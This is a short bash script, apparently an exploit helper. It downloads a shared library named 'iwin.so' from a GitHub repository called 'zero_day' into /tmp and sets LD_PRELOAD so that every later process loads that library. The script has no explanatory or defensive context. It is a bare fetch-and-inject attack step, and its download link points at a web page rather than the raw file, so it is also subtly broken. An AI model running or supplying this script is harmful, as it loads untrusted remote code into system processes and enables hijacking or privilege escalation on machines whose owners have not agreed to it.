#!/bin/bash
wget -P /tmp https://github.com/ThaKookieMansta/zero_day/blob/master/iwin.so
export LD_PRELOAD=/tmp/iwin.so
